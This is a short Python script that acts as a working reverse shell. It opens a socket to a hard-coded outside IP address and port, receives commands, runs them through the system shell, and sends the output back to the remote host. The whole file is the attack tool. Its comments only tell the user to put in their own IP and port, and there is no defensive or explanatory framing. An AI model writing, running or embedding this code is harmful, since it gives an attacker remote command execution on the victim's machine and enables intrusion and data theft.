import socket
import subprocess

HOST = '92.247.214.122'  # Replace with your IP
PORT = 9876              # Replace with your port

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

while True:
    try:
        # Receive command
        command = s.recv(1024).decode().strip()
        if command.lower() == "exit":
            break

        # Execute the command
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout + result.stderr

        # Send back the output
        if output:
            s.send(output.encode())
        else:
            s.send(b"[+] Command executed with no output.\n")

    except Exception as e:
        s.send(f"[-] Error: {str(e)}\n".encode())

s.close()
